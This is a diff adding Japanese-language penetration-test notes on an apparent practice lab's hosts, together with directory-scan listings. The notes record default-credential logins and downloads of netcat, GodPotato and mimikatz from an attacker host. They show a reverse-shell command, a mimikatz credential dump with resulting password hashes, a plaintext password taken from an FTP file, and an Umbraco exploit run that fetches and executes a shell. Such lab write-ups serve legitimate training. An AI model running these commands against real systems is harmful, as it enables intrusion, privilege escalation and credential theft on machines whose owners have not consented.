@@ -12,6 +12,143 @@ mark:x:1003:1003:Mark:/home/mark:/bin/sh
 anita:x:1004:1004:Anita:/home/anita:/bin/sh
 ```
 
+RCEには持って行けず
+
+248のdir scanで以下のログインポータルを発見し、`admin` `password`のデフォルトクレデンシャルでログイン可能
+```
+http://192.168.146.248/Host/portalid/0
+```
+
+DotNetNukeというCMSを使用しており、以下のユーザを発見
+```
+emma@relia.com
+```
+
+hacktricksに載ってるreverse shellの実行方法を使用しreverse shell獲得
+https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/dotnetnuke-dnn
+
+```
+iwr -uri http://192.168.45.233:8000/nc64.exe -outfile nc.exe
+iwr -uri http://192.168.45.233:8000/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+iwr -uri http://192.168.45.233:8000/agent.exe -outfile agent.exe
+iwr -uri http://192.168.45.233:8000/winPEASx64.exe -outfile winPEASx64.exe
+iwr -uri http://192.168.45.233:8000/mimikatz.exe -outfile mimikatz.exe
+```
+
+godpotatoでsystem shell獲得
+```
+./GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.233 4445"
+```
+
+mimikatz実行
+```
+.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets" exit > mimikatz_result.txt
+```
+
+markのハッシュ獲得
+```
+mark:666949a828be051120b17ccba8aebfbe
+emma:289953cccf62743ca4d1ed65183bd868
+Administrator:56e4633688c0fdd57c610faf9d7ab8df
+```
+
+crackを試みるが無理だった
+
+local.txtとproof.txtを取得 (.248)
+```
+type C:\Users\emma\Desktop\local.txt
+type C:\Users\mark\Desktop\proof.txt
+```
+
+いったんハッシュでnxc実行したが、どこも入れなさそう
+winpeas実行（時間かかりそう）
+
+.247の14020ポートでftpが動いてるのでanonymousでログイン
+```
+ftp ftp://anonymous:anonymous@192.168.146.247:14020
+```
+
+umbraco.pdfが見つかるのでダウンロードしてみると、以下のクレデンシャル情報が取れる
+```
+mark@relia.com:OathDeeplyReprieve91
+```
+
+web02.relia.comをetc/hostsに入れて14080にアクセスするとumbracoというCMSを利用していることわかる。
+markのクレデンシャル情報でログインし、umbraco v 7.12.4であることを見て、searchsploitで探す
+```
+searchsploit umbraco
+```
+
+49488.pyを利用して192.168.45.233 4449で頑張ってrevshell作成(powershellから直接は無理だった)
+```
+python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "mkdir ../../../../Tools"
+
+python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "iwr -uri http://192.168.45.233:8000/nc64.exe -outfile ../../../../Tools/nc.exe"
+
+python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "../../../../Tools/nc.exe 192.168.45.233 4449 -e cmd.exe"
+```
+
+godpotatoでsystemshell獲得
+```
+./GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.233 4445"
+```
+
+proof.txt取得
+```
+type C:\Users\Administrator\Desktop\proof.txt
+type C:\local.txt
+```
+
+mimiktazでクレデンシャル情報取得
+```
+mark:dcbbff66580202a5cbede9c010281ce9
+zachary:54abdf854d8c0653b1be3458454e4a3b
+```
+
+xampp以下のディレクトリでテキストを列挙
+```
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+```
+
+passwords.txtを発見
+```
+type C:\xampp\passwords.txt
+```
+
+```
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB & lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords). 
+```
 # Port Scan
 ## 249 LEGACY
 ### open ports
@@ -32,7 +169,7 @@ Open 192.168.102.249:49669
 Open 192.168.102.249:49670
 Open 192.168.102.249:49668
 ```
-### details
+### port details
 ```
 PORT      STATE SERVICE       REASON          VERSION
 80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
@@ -146,6 +283,220 @@ Host script results:
 
 ```
 
+### feroxbuster 8000
+```
+http://192.168.146.249:8000/img/module_table_top.png
+http://192.168.146.249:8000/img/module_table_bottom.png
+http://192.168.146.249:8000/cms/templates/plain.tpl
+http://192.168.146.249:8000/cms/templates/mobile.tpl
+http://192.168.146.249:8000/cms/templates/style.css
+http://192.168.146.249:8000/cms/templates/photo.tpl
+http://192.168.146.249:8000/cms/templates/sitemap.tpl
+http://192.168.146.249:8000/cms/templates/default.tpl
+http://192.168.146.249:8000/cms/templates/common.css
+http://192.168.146.249:8000/cms/templates/mobile.css
+http://192.168.146.249:8000/cms/templates/photo.css
+http://192.168.146.249:8000/cms/templates/editor.css
+http://192.168.146.249:8000/cms/templates/mobile-old.css
+http://192.168.146.249:8000/cms/templates/rss.tpl
+http://192.168.146.249:8000/cms/cms/
+http://192.168.146.249:8000/cms/Templates/plain.tpl
+http://192.168.146.249:8000/cms/Templates/photo.css
+http://192.168.146.249:8000/cms/Templates/style.css
+http://192.168.146.249:8000/cms/Templates/photo.tpl
+http://192.168.146.249:8000/cms/Templates/mobile.css
+http://192.168.146.249:8000/cms/Templates/default.tpl
+http://192.168.146.249:8000/cms/Templates/mobile.tpl
+http://192.168.146.249:8000/cms/Templates/rss.tpl
+http://192.168.146.249:8000/cms/Templates/mobile-old.css
+http://192.168.146.249:8000/cms/Templates/common.css
+http://192.168.146.249:8000/cms/Templates/editor.css
+http://192.168.146.249:8000/cms/Templates/sitemap.tpl
+http://192.168.146.249:8000/cms/files/
+http://192.168.146.249:8000/cms/templates/images/ritecms-powered.png
+http://192.168.146.249:8000/dashboard/images/social-icons.png
+http://192.168.146.249:8000/dashboard/images/fastly-logo@2x.png
+http://192.168.146.249:8000/dashboard/images/fastly-logo.png
+http://192.168.146.249:8000/dashboard/images/xampp-logo.svg
+http://192.168.146.249:8000/dashboard/images/bitnami-xampp.png
+http://192.168.146.249:8000/dashboard/images/xampp-newsletter-logo.png
+http://192.168.146.249:8000/dashboard/images/linux-logo.png
+http://192.168.146.249:8000/dashboard/images/middleman.png
+http://192.168.146.249:8000/dashboard/images/social-icons-large.png
+http://192.168.146.249:8000/dashboard/images/twitter-bird.png
+http://192.168.146.249:8000/dashboard/docs/backup-restore-mysql.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/configure-vhosts.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/troubleshoot-apache.html
+http://192.168.146.249:8000/dashboard/docs/deploy-git-app.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/use-php-fcgi.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf1.html
+http://192.168.146.249:8000/dashboard/docs/transfer-files-ftp.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/increase-php-file-upload-limit.html
+http://192.168.146.249:8000/dashboard/docs/change-mysql-temp-dir.html
+http://192.168.146.249:8000/dashboard/docs/change-mysql-temp-dir.pdf
+http://192.168.146.249:8000/dashboard/docs/send-mail.html
+http://192.168.146.249:8000/dashboard/docs/transfer-files-ftp.html
+http://192.168.146.249:8000/dashboard/docs/configure-vhosts.html
+http://192.168.146.249:8000/dashboard/docs/use-different-php-version.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/use-sqlite.html
+http://192.168.146.249:8000/dashboard/docs/use-sqlite.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/send-mail.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/configure-use-tomcat.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/install-wordpress.html
+http://192.168.146.249:8000/dashboard/docs/use-sqlite.pdf
+http://192.168.146.249:8000/dashboard/docs/use-php-fcgi.html
+http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf2.pdfmarks
+http://192.168.146.249:8000/dashboard/docs/deploy-git-app.html
+http://192.168.146.249:8000/dashboard/docs/access-phpmyadmin-remotely.pdf
+http://192.168.146.249:8000/dashboard/docs/configure-vhosts.pdf
+http://192.168.146.249:8000/dashboard/docs/use-php-fcgi.pdf
+http://192.168.146.249:8000/dashboard/docs/deploy-git-app.pdf
+http://192.168.146.249:8000/dashboard/docs/activate-use-xdebug.pdf
+http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf2.pdf
+http://192.168.146.249:8000/dashboard/docs/troubleshoot-apache.pdf
+http://192.168.146.249:8000/dashboard/Images/fastly-logo@2x.png
+http://192.168.146.249:8000/dashboard/Images/xampp-cloud.png
+http://192.168.146.249:8000/dashboard/Images/social-icons-large.png
+http://192.168.146.249:8000/dashboard/Images/favicon.png
+http://192.168.146.249:8000/dashboard/Images/background.png
+http://192.168.146.249:8000/dashboard/Images/xampp-logo.svg
+http://192.168.146.249:8000/dashboard/Images/bitnami-xampp.png
+http://192.168.146.249:8000/dashboard/Images/pdf-icon.png
+http://192.168.146.249:8000/dashboard/Images/sourceforge-logo.png
+http://192.168.146.249:8000/dashboard/Images/windows-logo.png
+http://192.168.146.249:8000/dashboard/Images/middleman.png
+http://192.168.146.249:8000/dashboard/Images/social-icons.png
+http://192.168.146.249:8000/dashboard/Images/addons-video-thumb.png
+http://192.168.146.249:8000/dashboard/Images/apple-logo.png
+http://192.168.146.249:8000/dashboard/Images/stack-icons.png
+http://192.168.146.249:8000/dashboard/Images/social-icons@2x.png
+http://192.168.146.249:8000/dashboard/Images/linux-logo.png
+http://192.168.146.249:8000/dashboard/Images/xampp-newsletter-logo.png
+http://192.168.146.249:8000/dashboard/Images/fastly-logo.png
+http://192.168.146.249:8000/dashboard/Images/sourceforge-logo@2x.png
+http://192.168.146.249:8000/dashboard/Images/social-icons-large@2x.png
+http://192.168.146.249:8000/dashboard/Images/stack-icons@2x.png
+http://192.168.146.249:8000/dashboard/Images/xampp-cloud@2x.png
+http://192.168.146.249:8000/dashboard/Images/twitter-bird.png
+http://192.168.146.249:8000/dashboard/
+http://192.168.146.249:8000/dashboard/javascripts/modernizr.js
+http://192.168.146.249:8000/dashboard/javascripts/all.js
+http://192.168.146.249:8000/dashboard/es/
+http://192.168.146.249:8000/dashboard/it/
+http://192.168.146.249:8000/dashboard/fr/
+http://192.168.146.249:8000/dashboard/pl/
+http://192.168.146.249:8000/dashboard/tr/
+http://192.168.146.249:8000/cms/
+http://192.168.146.249:8000/dashboard/jp/
+http://192.168.146.249:8000/dashboard/Docs/use-php-fcgi.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/change-mysql-temp-dir.html
+http://192.168.146.249:8000/dashboard/Docs/access-phpmyadmin-remotely.html
+http://192.168.146.249:8000/dashboard/Docs/install-wordpress.html
+http://192.168.146.249:8000/dashboard/Docs/send-mail.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/deploy-git-app.html
+http://192.168.146.249:8000/dashboard/Docs/activate-use-xdebug.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/configure-wildcard-subdomains.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/reset-mysql-password.html
+http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf2.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/troubleshoot-apache.html
+http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf1.pdf
+http://192.168.146.249:8000/dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/access-phpmyadmin-remotely.pdf
+http://192.168.146.249:8000/dashboard/Docs/use-sqlite.pdf
+http://192.168.146.249:8000/dashboard/Docs/backup-restore-mysql.html
+http://192.168.146.249:8000/dashboard/Docs/increase-php-file-upload-limit.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/install-wordpress.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/send-mail.pdf
+http://192.168.146.249:8000/dashboard/Docs/activate-use-xdebug.html
+http://192.168.146.249:8000/dashboard/Docs/reset-mysql-password.pdf
+http://192.168.146.249:8000/dashboard/Docs/change-mysql-temp-dir.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/use-php-fcgi.html
+http://192.168.146.249:8000/dashboard/Docs/deploy-git-app.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.249:8000/dashboard/Docs/create-framework-project-zf2.html
+http://192.168.146.249:8000/dashboard/Docs/transfer-files-ftp.pdf
+http://192.168.146.249:8000/Dashboard/images/linux-logo.png
+http://192.168.146.249:8000/Dashboard/images/fastly-logo.png
+http://192.168.146.249:8000/Dashboard/images/background.png
+http://192.168.146.249:8000/Dashboard/images/fastly-logo@2x.png
+http://192.168.146.249:8000/Dashboard/images/pdf-icon.png
+http://192.168.146.249:8000/Dashboard/images/favicon.png
+http://192.168.146.249:8000/Dashboard/images/xampp-logo.svg
+http://192.168.146.249:8000/Dashboard/images/social-icons-large@2x.png
+http://192.168.146.249:8000/Dashboard/images/xampp-newsletter-logo.png
+http://192.168.146.249:8000/Dashboard/images/sourceforge-logo@2x.png
+http://192.168.146.249:8000/Dashboard/images/apple-logo.png
+http://192.168.146.249:8000/Dashboard/images/middleman.png
+http://192.168.146.249:8000/Dashboard/images/social-icons.png
+http://192.168.146.249:8000/Dashboard/images/windows-logo.png
+http://192.168.146.249:8000/Dashboard/images/sourceforge-logo.png
+http://192.168.146.249:8000/Dashboard/images/stack-icons@2x.png
+http://192.168.146.249:8000/Dashboard/images/stack-icons.png
+http://192.168.146.249:8000/Dashboard/images/xampp-cloud.png
+http://192.168.146.249:8000/Dashboard/images/twitter-bird.png
+http://192.168.146.249:8000/Dashboard/docs/troubleshoot-apache.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/use-php-fcgi.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/auto-start-xampp.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/create-framework-project-zf1.html
+http://192.168.146.249:8000/Dashboard/docs/send-mail.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/use-sqlite.html
+http://192.168.146.249:8000/Dashboard/docs/configure-wildcard-subdomains.html
+http://192.168.146.249:8000/Dashboard/docs/backup-restore-mysql.html
+http://192.168.146.249:8000/Dashboard/docs/increase-php-file-upload-limit.pdf
+http://192.168.146.249:8000/Dashboard/docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/use-different-php-version.pdf
+http://192.168.146.249:8000/Dashboard/docs/configure-use-tomcat.html
+http://192.168.146.249:8000/Dashboard/docs/deploy-git-app.html
+http://192.168.146.249:8000/Dashboard/docs/send-mail.pdf
+http://192.168.146.249:8000/Dashboard/docs/configure-vhosts.pdf
+http://192.168.146.249:8000/Dashboard/docs/increase-php-file-upload-limit.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/configure-use-tomcat.pdfmarks
+http://192.168.146.249:8000/Dashboard/docs/troubleshoot-apache.html
+http://192.168.146.249:8000/Dashboard/docs/transfer-files-ftp.pdf
+http://192.168.146.249:8000/Dashboard/docs/create-framework-project-zf1.pdf
+http://192.168.146.249:8000/Dashboard/stylesheets/normalize.css
+http://192.168.146.249:8000/Dashboard/stylesheets/asciidoctor.css
+http://192.168.146.249:8000/Dashboard/stylesheets/all.css
+http://192.168.146.249:8000/Dashboard/stylesheets/all-rtl.css
+http://192.168.146.249:8000/Dashboard/de/
+http://192.168.146.249:8000/Dashboard/Images/Blog/phpinfo-section-1.png
+http://192.168.146.249:8000/cms/.DS_Store
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-3.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-manager.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-10.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/download-xampp-vm.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-php-output.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-11.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-1.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-volumes.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-general.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-7.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-5.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-9.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-6.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/phpinfo-section-1.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-4.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/phpinfo-section-2.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-php-finder.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/heartbleed-affected.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-2.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-tray.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/xampp-vm-cakephp-8.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/heartbleed-affected-osx.png
+http://192.168.146.249:8000/Dashboard/IMAGES/blog/
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-php-output.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-volumes.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-4.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-6.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-5.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-9.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-cakephp-1.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/xampp-vm-tray.png
+http://192.168.146.249:8000/Dashboard/Images/BLOG/heartbleed-affected-osx.png
+http://192.168.146.249:8000/cms/media/.ds_store
+http://192.168.146.249:8000/Dashboard/zh_tw/
+```
 ## 248 EXTERNAL
 ### open ports
 ```
@@ -165,7 +516,7 @@ Open 192.168.102.248:49666
 Open 192.168.102.248:49667
 Open 192.168.102.248:49965
 ```
-### details
+### port details
 ```
 PORT      STATE SERVICE       REASON          VERSION
 80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
@@ -322,6 +673,64 @@ Host script results:
 |_  start_date: N/A
 
 ```
+### froxbuster
+```
+http://192.168.146.248/js/dnn.modalpopup.js
+http://192.168.146.248/Portals/_default/Skins/Xcillion/js/jquery.smartmenus.bootstrap.js
+http://192.168.146.248/Resources/Search/SearchSkinObjectPreview.js
+http://192.168.146.248/Portals/_default/Skins/Xcillion/css/jquery.smartmenus.bootstrap.css
+http://192.168.146.248/Portals/_default/Skins/Xcillion/js/scripts.js
+http://192.168.146.248/js/dnn.servicesframework.js
+http://192.168.146.248/Resources/libraries/jQuery-Migrate/03_04_00/jquery-migrate.js
+http://192.168.146.248/Portals/_default/Skins/Xcillion/Menus/MainMenu/MainMenu.css
+http://192.168.146.248/Resources/Search/SearchSkinObjectPreview.css
+http://192.168.146.248/Portals/0/Images/logo.png
+http://192.168.146.248/Portals/0/home.css
+http://192.168.146.248/js/dnncore.js
+http://192.168.146.248/DesktopModules/Admin/Authentication/module.css
+http://192.168.146.248/Resources/Shared/Scripts/jquery/jquery.hoverIntent.min.js
+http://192.168.146.248/Portals/_default/Skins/Xcillion/skin.css
+http://192.168.146.248/Portals/_default/Skins/Xcillion/js/jquery.smartmenus.js
+http://192.168.146.248/js/dnn.js
+http://192.168.146.248/portals/0/Images/logo2.png
+http://192.168.146.248/Portals/_default/Skins/Xcillion/bootstrap/js/bootstrap.min.js
+http://192.168.146.248/Portals/_default/Skins/Xcillion/bootstrap/css/bootstrap.min.css
+http://192.168.146.248/Resources/libraries/jQuery/03_05_01/jquery.js
+http://192.168.146.248/Privacy
+http://192.168.146.248/Resources/Shared/stylesheets/dnndefault/7.0.0/default.css
+http://192.168.146.248/Resources/Shared/Scripts/dnn.jquery.js
+http://192.168.146.248/Resources/libraries/jQuery-UI/01_13_02/jquery-ui.min.js
+http://192.168.146.248/Login
+http://192.168.146.248/Terms
+http://192.168.146.248/Home/ctl/SendPassword
+http://192.168.146.248/login
+http://192.168.146.248/
+http://192.168.146.248/privacy
+http://192.168.146.248/terms
+http://192.168.146.248/Search-Results
+http://192.168.146.248/Resources/Libraries/Selectize/00_12_06/dnn.combobox.js
+http://192.168.146.248/Resources/libraries/Selectize/00_12_06/selectize.min.js
+http://192.168.146.248/Portals/_default/Skins/_default/WebControlSkin/Default/DropDownList.default.css
+http://192.168.146.248/Resources/Libraries/Selectize/00_12_06/selectize.default.css
+http://192.168.146.248/search-results
+http://192.168.146.248/DesktopModules/admin/SearchResults/dnn.searchResult.js
+http://192.168.146.248/Resources/Shared/scripts/dnn.searchBox.js
+http://192.168.146.248/DesktopModules/Admin/SearchResults/module.css
+http://192.168.146.248/Resources/Libraries/Selectize/00_12_06/selectize.css
+http://192.168.146.248/Resources/Shared/stylesheets/dnn.searchBox.css
+http://192.168.146.248/Host/ctl/Login/portalid/0
+Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+http://192.168.146.248/Host/ctl/Login/Terms-Of-Use
+http://192.168.146.248/Host/ctl/Login/Test3
+http://192.168.146.248/Host/ctl/Login/TestArea
+http://192.168.146.248/Host/ctl/Login/TestErrorPage
+http://192.168.146.248/Host/ctl/Login/TestMail
+http://192.168.146.248/404-error-page
+http://192.168.146.248/Host/ctl/Login/commentrss
+http://192.168.146.248/404-Error-Page
+http://192.168.146.248/PRIVACY
+http://192.168.146.248/TERMS
+```
 ## 247 WEB02
 ### open ports
 ```
@@ -343,7 +752,7 @@ Open 192.168.102.247:49669
 Open 192.168.102.247:49667
 Open 192.168.102.247:49670
 ```
-### details
+### port details
 ```
 PORT      STATE SERVICE       REASON          VERSION
 80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
@@ -486,6 +895,387 @@ Host script results:
 |_clock-skew: mean: 0s, deviation: 0s, median: 0s
 
 ```
+### feroxbuster
+```
+http://192.168.146.247/js/scripts.js
+http://192.168.146.247/img/module_table_top.png
+http://192.168.146.247/img/module_table_bottom.png
+http://192.168.146.247/pdfs/WelcomeLetter.pdf
+http://192.168.146.247/css/styles.css
+http://192.168.146.247/pdfs/New-Hire-Form.pdf
+http://192.168.146.247/assets/favicon.ico
+http://192.168.146.247/pdfs/Mission.pdf
+http://192.168.146.247/
+http://192.168.146.247/pdfs/Policies%20(2).pdf
+http://192.168.146.247/assets/welcome.png
+http://192.168.146.247/CSS/styles.css
+http://192.168.146.247/dashboard/images/bitnami-xampp.png
+http://192.168.146.247/dashboard/images/xampp-logo.svg
+http://192.168.146.247/dashboard/images/social-icons@2x.png
+http://192.168.146.247/dashboard/images/background.png
+http://192.168.146.247/dashboard/images/fastly-logo.png
+http://192.168.146.247/dashboard/images/social-icons-large.png
+http://192.168.146.247/dashboard/images/social-icons-large@2x.png
+http://192.168.146.247/dashboard/images/xampp-cloud.png
+http://192.168.146.247/dashboard/images/addons-video-thumb.png
+http://192.168.146.247/dashboard/images/social-icons.png
+http://192.168.146.247/dashboard/images/fastly-logo@2x.png
+http://192.168.146.247/dashboard/images/sourceforge-logo@2x.png
+http://192.168.146.247/dashboard/images/sourceforge-logo.png
+http://192.168.146.247/dashboard/images/apple-logo.png
+http://192.168.146.247/dashboard/images/xampp-newsletter-logo.png
+http://192.168.146.247/dashboard/images/pdf-icon.png
+http://192.168.146.247/dashboard/images/linux-logo.png
+http://192.168.146.247/dashboard/images/windows-logo.png
+http://192.168.146.247/dashboard/images/favicon.png
+http://192.168.146.247/JS/scripts.js
+http://192.168.146.247/dashboard/images/xampp-cloud@2x.png
+http://192.168.146.247/dashboard/images/middleman.png
+http://192.168.146.247/dashboard/images/stack-icons.png
+http://192.168.146.247/dashboard/images/stack-icons@2x.png
+http://192.168.146.247/dashboard/images/twitter-bird.png
+http://192.168.146.247/dashboard/docs/use-php-fcgi.html
+http://192.168.146.247/dashboard/docs/configure-use-tomcat.pdfmarks
+http://192.168.146.247/dashboard/docs/change-mysql-temp-dir.pdfmarks
+http://192.168.146.247/dashboard/docs/install-wordpress.pdfmarks
+http://192.168.146.247/dashboard/docs/troubleshoot-apache.pdfmarks
+http://192.168.146.247/dashboard/docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.247/dashboard/docs/increase-php-file-upload-limit.pdfmarks
+http://192.168.146.247/dashboard/docs/auto-start-xampp.pdfmarks
+http://192.168.146.247/dashboard/docs/configure-wildcard-subdomains.pdfmarks
+http://192.168.146.247/dashboard/docs/configure-vhosts.pdfmarks
+http://192.168.146.247/dashboard/docs/reset-mysql-password.pdfmarks
+http://192.168.146.247/dashboard/docs/transfer-files-ftp.pdfmarks
+http://192.168.146.247/dashboard/docs/deploy-git-app.pdfmarks
+http://192.168.146.247/dashboard/docs/reset-mysql-password.html
+http://192.168.146.247/dashboard/docs/transfer-files-ftp.html
+http://192.168.146.247/dashboard/docs/activate-use-xdebug.html
+http://192.168.146.247/dashboard/docs/auto-start-xampp.html
+http://192.168.146.247/dashboard/docs/configure-use-tomcat.html
+http://192.168.146.247/dashboard/docs/deploy-git-app.html
+http://192.168.146.247/dashboard/docs/send-mail.html
+http://192.168.146.247/dashboard/docs/increase-php-file-upload-limit.pdf
+http://192.168.146.247/dashboard/docs/access-phpmyadmin-remotely.html
+http://192.168.146.247/dashboard/docs/access-phpmyadmin-remotely.pdfmarks
+http://192.168.146.247/dashboard/docs/use-sqlite.pdfmarks
+http://192.168.146.247/dashboard/docs/change-mysql-temp-dir.html
+http://192.168.146.247/dashboard/docs/send-mail.pdfmarks
+http://192.168.146.247/dashboard/docs/configure-vhosts.html
+http://192.168.146.247/dashboard/docs/create-framework-project-zf2.html
+http://192.168.146.247/dashboard/docs/backup-restore-mysql.html
+http://192.168.146.247/dashboard/docs/change-mysql-temp-dir.pdf
+http://192.168.146.247/dashboard/docs/troubleshoot-apache.html
+http://192.168.146.247/Assets/favicon.ico
+http://192.168.146.247/dashboard/docs/auto-start-xampp.pdf
+http://192.168.146.247/dashboard/docs/install-wordpress.html
+http://192.168.146.247/dashboard/docs/use-php-fcgi.pdfmarks
+http://192.168.146.247/dashboard/docs/activate-use-xdebug.pdfmarks
+http://192.168.146.247/dashboard/docs/backup-restore-mysql.pdfmarks
+http://192.168.146.247/dashboard/docs/use-different-php-version.pdfmarks
+http://192.168.146.247/dashboard/docs/create-framework-project-zf2.pdfmarks
+http://192.168.146.247/dashboard/docs/increase-php-file-upload-limit.html
+http://192.168.146.247/dashboard/docs/access-phpmyadmin-remotely.pdf
+http://192.168.146.247/dashboard/docs/use-php-fcgi.pdf
+http://192.168.146.247/dashboard/docs/reset-mysql-password.pdf
+http://192.168.146.247/dashboard/docs/use-sqlite.pdf
+http://192.168.146.247/dashboard/docs/configure-wildcard-subdomains.pdf
+http://192.168.146.247/dashboard/docs/create-framework-project-zf1.pdf
+http://192.168.146.247/dashboard/Images/sourceforge-logo.png
+http://192.168.146.247/dashboard/Images/bitnami-xampp.png
+http://192.168.146.247/dashboard/Images/fastly-logo.png
+http://192.168.146.247/dashboard/Images/middleman.png
+http://192.168.146.247/dashboard/Images/stack-icons.png
+http://192.168.146.247/dashboard/Images/background.png
+http://192.168.146.247/dashboard/docs/configure-vhosts.pdf
+http://192.168.146.247/dashboard/Images/xampp-newsletter-logo.png
+http://192.168.146.247/dashboard/Images/addons-video-thumb.png
+http://192.168.146.247/dashboard/Images/windows-logo.png
+http://192.168.146.247/dashboard/Images/favicon.png
+http://192.168.146.247/dashboard/Images/social-icons-large@2x.png
+http://192.168.146.247/dashboard/Images/xampp-logo.svg
+http://192.168.146.247/dashboard/Images/social-icons@2x.png
+http://192.168.146.247/dashboard/Images/pdf-icon.png
+http://192.168.146.247/dashboard/docs/deploy-git-app.pdf
+http://192.168.146.247/dashboard/docs/transfer-files-ftp.pdf
+http://192.168.146.247/dashboard/Images/xampp-cloud@2x.png
+http://192.168.146.247/dashboard/docs/use-different-php-version.html
+http://192.168.146.247/dashboard/docs/activate-use-xdebug.pdf
+http://192.168.146.247/dashboard/docs/use-sqlite.html
+http://192.168.146.247/dashboard/docs/backup-restore-mysql.pdf
+http://192.168.146.247/dashboard/docs/send-mail.pdf
+http://192.168.146.247/dashboard/docs/install-wordpress.pdf
+http://192.168.146.247/Assets/welcome.png
+http://192.168.146.247/dashboard/docs/use-different-php-version.pdf
+http://192.168.146.247/dashboard/stylesheets/normalize.css
+http://192.168.146.247/Js/scripts.js
+http://192.168.146.247/dashboard/javascripts/modernizr.js
+http://192.168.146.247/dashboard/stylesheets/asciidoctor.css
